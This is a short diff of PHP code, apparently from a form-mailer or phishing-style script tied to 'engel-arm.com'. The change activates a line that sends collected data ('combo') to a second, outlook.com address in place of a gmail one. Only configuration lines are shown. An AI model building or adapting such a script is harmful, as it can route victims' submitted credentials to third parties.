@@ -37,7 +37,7 @@
         @$client = "engel-arm.com";
         @$sitioWeb = $httphost;
         @$sendTo = "edgar.edgarroman@gmail.com";
-        // @$sendTo = "hosting2.0@outlook.com";
+        @$sendTo = "hosting2.0@outlook.com";
 
         @$combo="";
         @$linea="";
